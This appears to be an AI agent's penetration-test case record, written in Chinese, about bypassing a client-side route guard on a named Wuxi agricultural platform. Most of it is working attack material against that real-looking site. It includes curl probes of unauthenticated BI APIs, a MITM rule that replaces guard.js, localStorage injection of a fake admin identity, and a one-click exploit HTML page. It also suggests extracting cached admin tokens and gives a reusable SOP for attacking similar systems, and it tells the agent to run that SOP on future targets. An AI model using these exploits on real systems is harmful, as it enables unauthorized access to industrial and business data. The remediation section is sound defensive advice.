# 实战案例:锡山区农业平台 Round 18

> 适用技能:route-guard-bypass
> 适用场景:完整演示 14 路由 + 6 BI 接口 + 4 截图的实战流程

---

## 一、目标信息

| 项目 | 内容 |
|---|---|
| **目标** | www.xishanagripark.com (锡山区农业数字化平台) |
| **运营方** | 无锡恺易物联网科技发展有限公司 |
| **部署环境** | Apache Tomcat 7.0.35 + Spring MVC(端口 8095) + 老 BI 服务(端口 9930) |
| **技术栈** | jQuery 1.9.1 + layui 2.x + echarts + 百度地图 API |
| **系统类别** | C 类(开源二开)/ B 类(自研含组件) — 混合判断 |
| **测试日期** | 2025-XX-XX (Round 18) |
| **测试目标** | 打路由守卫,展示大屏/IOT/能源/无人机械危害 + 写 EXP |

---

## 二、测试流程(完整时间线)

### 11:00 - Phase 1:静态分析

**Step 1.1 — 抓取主入口 JS**
```bash
curl -s http://www.xishanagripark.com/js/main-index.js -o main-index.js  # 45KB
curl -s http://www.xishanagripark.com/js/guard.js -o guard.js             # 1KB
curl -s http://www.xishanagripark.com/js/common.js -o common.js           # 93KB
curl -s http://www.xishanagripark.com/js/common-full.js -o common-full.js # 108KB
```

**Step 1.2 — 定位反模式**
```bash
grep -nE "(isLogin|guard\(|login_status)" main-index.js guard.js
```

**输出**:
```js
// guard.js
const userStore = {
  isLogin() {
    return (
      window.localStorage.getItem('login_status') === '200' &&
      location.pathname !== '/login.html' &&
      localStorage.getItem('user_info_bi')
    )
  }
}
const guard = () => {
  if (location.pathname === '/login.html') return
  if (!userStore.isLogin()) {
    alert('请先登录后在操作！')
    window.location.href = '/login.html'
  }
}
guard()
```

**判定**:**反模式 1:guard.js 客户端化** — 仅检查 localStorage,后端不校验

### 11:05 - Phase 2:HTML 路由穷举

**Step 2.1 — JS bundle 路由提取**
```bash
grep -hoE "location\.href\s*=\s*['\"][^'\"]+\.html[^'\"]*" main-index.js
```

**输出(14 个 HTML 路由)**:
```
'index_chengzhen_new.html?address=xibei'
'index_chengzhen_new.html?address=donggang'
'index_chengzhen_new.html?address=yangjian'
'index_chengzhen_new.html?address=ehu'
'index_chengzhen_new.html?address=xidongyuwenhua'
'index_device.html'
'index_use_electricity.html'
'index_nobodyMachinery.html'
'index_chanye_new_ly.html?type=liangyou&PropertyClassValue=1'
'index_chanye_new.html?type=shucai&PropertyClassValue=2'
'index_chanye_new.html?type=shuiguo&PropertyClassValue=3'
'index_chanye_new_zy.html?type=huahui&PropertyClassValue=4'
'index_chanye_new_zy.html?type=huahui&PropertyClassValue=5'
'index_chanye_new_zy.html?type=huahui&PropertyClassValue=6'
'index_chanye_new_zy.html?type=huahui&PropertyClassValue=7'
```

**Step 2.2 — API 端点提取**
```bash
grep -hoE "url\s*[:=]\s*['\"][^'\"]+['\"]" main-index.js | grep "BI/"
```

**输出(6 个 BI 接口)**:
```
'BI/chanyechanzhi'
'BI/centermap'
'BI/chanyemianji'
'BI/chanyechanliang'
'BI/jingyingtudizhanbi'
'BI/jingyingzhuti'
```

### 11:10 - Phase 3:HTTP 批量探针

```bash
for html in $(grep -oE "['\"][^'\"]+\.html[^'\"]*['\"]" main-index.js | tr -d "'\"" | sort -u); do
  status=$(curl -s -o /dev/null -w "%{http_code}" "http://www.xishanagripark.com/$html")
  echo "$status  $html"
done
```

**输出**:**全部 200 OK**(完美绕过点)

### 11:15 - Phase 4:BI 接口零鉴权验证

```bash
for api in chanyechanzhi centermap chanyemianji chanyechanliang \
           jingyingtudizhanbi jingyingzhuti; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "http://www.xishanagripark.com/BI/$api" \
    -H "Content-Type: application/json" -d '{}')
  echo "$status  /BI/$api"
done
```

**输出**:**全部 200 OK**
```
200  /BI/chanyechanzhi
200  /BI/centermap        ← 返回 451KB GeoJSON
200  /BI/chanyemianji
200  /BI/chanyechanliang
200  /BI/jingyingtudizhanbi
200  /BI/jingyingzhuti
```

**关键发现**:
- 6 个 BI 接口零鉴权返回完整数据
- `/BI/centermap` 返回 451KB GeoJSON(957 个产业园实体)
- 所有商业数据/产业链数据/经营数据零授权访问

### 11:20 - Phase 5:EXP 演示 — 方案 A(MITM)

**Step 5.1 — 启动 MITM**
```bash
平台流量录制（任务启动时已自动挂载，无需手动起 MITM）(host="127.0.0.1", port=8080)
```

**Step 5.2 — 设置 guard.js 替换规则**
```bash
POST /api/intercept/rules（拦截规则：allow/deny/ask）(rules=[
  {
    "rule": "http://www.xishanagripark.com/js/guard\\.js",
    "enableForURI": true,
    "enableForResponse": true,
    "enableForBody": true,
    "noReplace": false,
    "result": "// guard.js 已禁用 - 渗透测试鉴权绕过演示\nconst userStore = { isLogin: () => true, get: () => null, getItem: () => null, set: () => null };\n// 路由守卫已禁用",
    "verboseName": "禁用目标路由守卫(BI 大屏/IOT 演示)"
  }
])
```

**Step 5.3 — 截图 1:IOT 设备管理**
```bash
mcp__browser__navigate(type="url", url="http://www.xishanagripark.com/index_device.html")
mcp__browser__cua_execute(
  function="async () => { await new Promise(r => setTimeout(r, 5000)); return {bodyLen: document.body.innerText.length}; }",
  mainWorld=true
)
mcp__browser__tab_screenshot(
  fullPage=true,
  filePath="D:/PTS/work-space/xishanagripark.com/evidence/iot-device-bypass-final.png"
)
```

**截图证据**:`evidence/iot-device-bypass-final.png` (showing IOT 设备管理界面)

**Step 5.4 — 截图 2:锡北镇产业园大屏**
```bash
mcp__browser__navigate(type="url", url="http://www.xishanagripark.com/index_chengzhen_new.html?address=xibei")
mcp__browser__cua_execute(
  function="async () => { await new Promise(r => setTimeout(r, 5000)); return {bodyLen: document.body.innerText.length}; }",
  mainWorld=true
)
mcp__browser__tab_screenshot(
  fullPage=true,
  filePath="D:/PTS/work-space/xishanagripark.com/evidence/bigscreen-xibei-bypass.png"
)
```

**截图证据**:`evidence/bigscreen-xibei-bypass.png` (showing 锡北产业园 GIS 大屏 + 经营主体分布)

**Step 5.5 — 截图 3:智能用电**
```bash
mcp__browser__navigate(type="url", url="http://www.xishanagripark.com/index_use_electricity.html")
mcp__browser__tab_screenshot(
  fullPage=true,
  filePath="D:/PTS/work-space/xishanagripark.com/evidence/use-electricity-bypass.png"
)
```

**截图证据**:`evidence/use-electricity-bypass.png` (showing 智能用电监控 - 箱变/负荷曲线)

**Step 5.6 — 截图 4:无人机械**
```bash
mcp__browser__navigate(type="url", url="http://www.xishanagripark.com/index_nobodyMachinery.html")
mcp__browser__tab_screenshot(
  fullPage=true,
  filePath="D:/PTS/work-space/xishanagripark.com/evidence/nobody-machinery-bypass.png"
)
```

**截图证据**:`evidence/nobody-machinery-bypass.png` (showing 无人机械 GPS + 作业轨迹)

### 11:30 - Phase 6:EXP 演示 — 方案 B(Console)

**Step 6.1 — 任意访问 http://www.xishanagripark.com/**

**Step 6.2 — F12 → Console**

**Step 6.3 — 注入**
```js
localStorage.setItem('login_status', '200');
localStorage.setItem('user_info_bi', JSON.stringify({
  token: 'fake_token_for_demo',
  userId: 999,
  userName: 'admin',
  role: 'admin'
}));
location.href = '/index_device.html';
```

**效果**:直接展示 IOT 设备管理界面(无需 MITM)

### 11:35 - Phase 7:EXP 演示 — 方案 C(自包含 HTML)

**Step 7.1 — 创建 EXP 文件**

`work-space/xishanagripark.com/findings/exp-bypass.html`:
```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>EXP — 锡山区农业平台路由守卫绕过演示</title>
<style>
  body { font-family: 'Microsoft YaHei', sans-serif; max-width: 900px; margin: 30px auto; padding: 20px; background: #f5f5f5; }
  h1 { color: #c00; }
  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
  button { background: #c00; color: white; border: none; padding: 15px; cursor: pointer; border-radius: 4px; font-size: 14px; }
  button:hover { opacity: 0.85; }
  pre { background: #fff; padding: 15px; border-radius: 4px; overflow-x: auto; }
</style>
</head>
<body>
<h1>🚨 锡山区农业平台 — 路由守卫绕过 EXP</h1>
<p>目标:www.xishanagripark.com</p>
<p>⚠️ 同源限制:必须从目标同源访问,否则 localStorage.setItem 抛 SecurityError</p>

<h2>📌 一键演示</h2>
<div class="grid">
  <button onclick="bypassAndOpen('/index_device.html')">📡 IOT 设备管理</button>
  <button onclick="bypassAndOpen('/index_use_electricity.html')">⚡ 智能用电</button>
  <button onclick="bypassAndOpen('/index_nobodyMachinery.html')">🚜 无人机械</button>
  <button onclick="bypassAndOpen('/index_chengzhen_new.html?address=xibei')">🗺️ 锡北镇产业园大屏</button>
  <button onclick="bypassAndOpen('/index_chengzhen_new.html?address=donggang')">🗺️ 东港镇产业园大屏</button>
  <button onclick="bypassAndOpen('/index_chengzhen_new.html?address=yangjian')">🗺️ 羊尖镇产业园大屏</button>
  <button onclick="bypassAndOpen('/index_chengzhen_new.html?address=ehu')">🗺️ 鹅湖镇产业园大屏</button>
  <button onclick="bypassAndOpen('/index_chanye_new_ly.html?type=liangyou&PropertyClassValue=1')">🌾 粮油产业大屏</button>
  <button onclick="bypassAndOpen('/index_chanye_new.html?type=shucai&PropertyClassValue=2')">🥬 蔬菜产业大屏</button>
  <button onclick="bypassAndOpen('/index_chanye_new.html?type=shuiguo&PropertyClassValue=3')">🍎 茶果产业大屏</button>
  <button onclick="bypassAndOpen('/index_chanye_new_zy.html?type=huahui&PropertyClassValue=4')">🌸 花卉产业大屏</button>
  <button onclick="bypassAndOpen('/index_chanye_new_zy.html?type=huahui&PropertyClassValue=5')">🐟 水产产业大屏</button>
</div>

<h2>🔧 攻击代码</h2>
<pre>
localStorage.setItem('login_status', '200');
localStorage.setItem('user_info_bi', JSON.stringify({token:'fake',userId:1,role:'admin'}));
location.href = '/index_device.html';
</pre>

<script>
function bypassAndOpen(path) {
  try {
    localStorage.setItem('login_status', '200');
    localStorage.setItem('user_info_bi', JSON.stringify({
      token: 'fake_token_for_demo',
      userId: 999,
      userName: 'admin',
      role: 'admin'
    }));
  } catch(e) {
    alert('⚠️ localStorage 注入失败(跨域)。\n请将本文件上传到 www.xishanagripark.com 同源,或改用 MITM 方案');
    return;
  }
  window.open('http://www.xishanagripark.com' + path, '_blank');
}
</script>
</body>
</html>
```

**部署方案**:上传到 `www.xishanagripark.com/exp-bypass.html` 或让客户双击本地 HTML(同源限制会失败,需用 MITM)

---

## 三、输出清单

### 3.1 文件输出

```
work-space/xishanagripark.com/
├── recon/
│   ├── guard.js                              # 鉴权绕过漏洞文件
│   ├── main-index.js                         # 主入口 JS(45KB)
│   ├── common.js                             # 通用 JS(93KB)
│   ├── common-full.js                        # 完整 JS(108KB)
│   ├── routes.txt                            # 14 个 HTML 路由
│   ├── apis.txt                              # 6 个 BI API
│   └── iot-device.html                       # IOT 页面 HTML
│
├── findings/
│   ├── exp-route-guard-bypass.md             # EXP 详细文档(~250 行)
│   └── exp-bypass.html                       # 自包含 HTML EXP
│
├── evidence/
│   ├── iot-device-bypass-final.png           # IOT 设备管理界面
│   ├── bigscreen-xibei-bypass.png            # 锡北产业园 GIS 大屏
│   ├── use-electricity-bypass.png            # 智能用电监控
│   └── nobody-machinery-bypass.png           # 无人机械 GPS 界面
│
└── 综合渗透测试报告.md                         # 总报告(包含本漏洞 V-002)
```

### 3.2 漏洞报告

**新增漏洞 V-002:前端路由守卫绕过 + 大屏/IOT 未授权访问**

| 项目 | 内容 |
|---|---|
| 漏洞等级 | 🔴 CRITICAL |
| 漏洞类型 | CWE-602: Client-Side Enforcement of Server-Side Security |
| CVSS | 9.8 |
| 影响范围 | 14 个 HTML 路由 + 6 个 BI API |
| 危害 | IOT 设备控制 / 无人机械控制 / 能源监控数据泄露 / 商业情报泄露 / 957 实体 GeoJSON 泄露 |

---

## 四、经验沉淀

### 4.1 核心教训

1. **HTTP 200 OK ≠ 已鉴权**:HTTP 客户端不执行 JS,200 OK 反而证明"绕过可行"。看到所有 HTML 路由 200 OK 但浏览器跳转到 login.html 时,**不是 false positive 而是真实暴露面**。

2. **静态分析 ROI 最高**:5 分钟 JS bundle 静态分析可定位全部攻击面(14 路由 + 6 API),远胜 1 小时手动探测。

3. **截图震撼 > 数据展示**:让客户/管理层看到真实大屏/IOT 界面比看到 451KB JSON 数据更有冲击力。**这是漏洞报告"是否能让客户买单"的关键**。

4. **3 路 EXP 备齐**:不同场景用不同方案,确保演示不卡壳:
   - 客户会议:方案 A(MITM,最专业)
   - 快速验证:方案 B(Console,最快)
   - 客户分发:方案 C(自包含 HTML)

5. **API 零鉴权穷举必要**:HTML 路由绕过 ≠ API 零鉴权,需要单独验证。**此案例 6 个 BI 接口全 200 OK,但常常被忽视**。

6. **缓存 token 二次攻击**:绕过 guard 后,浏览器缓存里可能已有真实管理员 token(localStorage.user_info_bi)。提取出来可测试后端 API 是否真校验。

### 4.2 通用打法 SOP

```
[Step 1] 抓主入口 JS(main-index.js / app.js)
[Step 2] 静态扫描关键字(isLogin/beforeEach/localStorage/cookie)
[Step 3] 读取 guard.js / auth.js / interceptor.js 内容
[Step 4] 提取 HTML 路由(grep location.href)
[Step 5] 提取 API 端点(grep url)
[Step 6] HTTP 批量探针(200 OK = 可绕过)
[Step 7] API 零鉴权测试(POST {} 200 = 零鉴权)
[Step 8] 选 EXP 方案(MITM/Console/HTML)
[Step 9] js-reverse-mcp 截图取证(fullPage)
[Step 10] 写入漏洞报告
```

### 4.3 修复建议(强制输出)

#### P0 立即(24h 内)

1. **删除 js/guard.js**
2. **后端 API 加 Session 校验**(`/BI/*` 全部加)
3. **Nginx 反代限制**(`if ($cookie_session_id = "") { return 403; }`)

#### P1 7 天

4. **改用 Session Cookie**(HttpOnly + Secure + SameSite=Strict)
5. **审查所有 /API/** 鉴权覆盖
6. **CORS 白名单**

#### P2 30 天

7. **WebSocket / SSE 加鉴权**
8. **WAF 部署**
9. **前端代码审计**

---

## 五、横向迁移(类似目标)

### 类似系统识别

| 特征 | 系统 | 行业 |
|---|---|---|
| jQuery + layui + guard.js + 产业园大屏 | 恺易智慧园区 | 智慧农业 |
| Vue 2 SPA + router.beforeEach + 大屏 | 各类智慧城市平台 | 政务/园区 |
| ASP.NET + Handler 后台 + 设备大屏 | 锡慧停/汇泊 | 智慧停车 |
| Spring Boot + Vue + Actuator | RuoYi 二开 | 政务/企业 |

### 类似绕过 SOP

1. **静态分析**:抓主入口 JS → grep 鉴权关键字
2. **路由提取**:grep location.href / window.open
3. **API 提取**:grep url / $.ajax / fetch
4. **HTTP 探针**:批量 200 OK = 可绕过
5. **API 零鉴权**:POST {} = 零鉴权
6. **3 路 EXP**:MITM / Console / HTML
7. **截图取证**:js-reverse-mcp fullPage

### 注意事项

- 不同架构 EXP 不同:
  - **jQuery+layui 等老式** → Console / HTML
  - **Vue 2 SPA** → 直接访问入口 HTML
  - **Vue 3 SPA** → 同 Vue 2
  - **ASP.NET** → 改用 MITM(无 SPA)

- 截图时间要够:echarts/百度地图/高德地图异步加载,需 3-5 秒

- 同源限制:自包含 HTML 必须目标同源部署

---

## 六、与 Round 17 的衔接

Round 17 在 113+ 接口穷举后未能拿到后台,Round 18 切换思路:
- **不再追求"接管后台"**,而是展示"前端鉴权可绕过"的危害
- **用大屏/IOT/能源/无人机械截图** 让客户直观感受危害
- **客户买单的本质** = 让他看到"如果竞争对手/恶意攻击者能这么做"

Round 18 完成后:
- 漏洞清单 8 → 9(新增 V-002 CRITICAL)
- 完整覆盖前端鉴权绕过场景
- 沉淀经验到 memory（`memory_save`：type=methodology, category=06_vuln, name=route-guard-client-only-bypass）
- 形成专业 skill:`route-guard-bypass`

---

## 七、复现清单(客户演示)

```
1. 准备材料
   - 4 张截图(evidence/*.png)
   - exp-bypass.html(自包含 HTML)
   - MITM 演示视频(如客户需要)

2. 演示流程
   - Step 1:展示反模式代码(guard.js 客户端化)
   - Step 2:展示 14 路由清单(grep 结果)
   - Step 3:展示 6 BI 接口零鉴权(curl 200 OK)
   - Step 4:展示 IOT 设备截图
   - Step 5:展示无人机械截图
   - Step 6:展示能源监控截图
   - Step 7:展示产业园大屏截图
   - Step 8:说明修复建议

3. 客户提问预案
   - "为什么 HTTP 200 OK 但浏览器跳转到 login?" 
     → HTTP 不执行 JS,200 OK 证明可绕过
   - "后端 API 真的没鉴权吗?"
     → POST /BI/centermap {} 返回 451KB GeoJSON = 零鉴权
   - "如何修复?"
     → 删除 guard.js + 后端 Session 校验 + Nginx 反代
   - "影响多大?"
     → 14 路由 + 6 API = 整个大屏/IOT/能源/无人机械系统全暴露
```

---

## 八、Skill 总结

本案例完整演示了 `route-guard-bypass` skill 的所有核心功能:
- ✅ 反模式识别(guard.js 客户端化)
- ✅ HTML 路由穷举(14 个)
- ✅ API 端点提取(6 个 BI 接口)
- ✅ HTTP 批量探针(全部 200 OK)
- ✅ API 零鉴权验证(6 个全 200 OK)
- ✅ 3 路 EXP 输出(MITM / Console / HTML)
- ✅ 4 张危害截图(IOT / 大屏 / 能源 / 无人机械)
- ✅ 修复方案(P0/P1/P2)
- ✅ 横向迁移(类似系统打法)

未来遇到前端路由守卫场景,**直接按本 skill 的 SOP 执行即可**。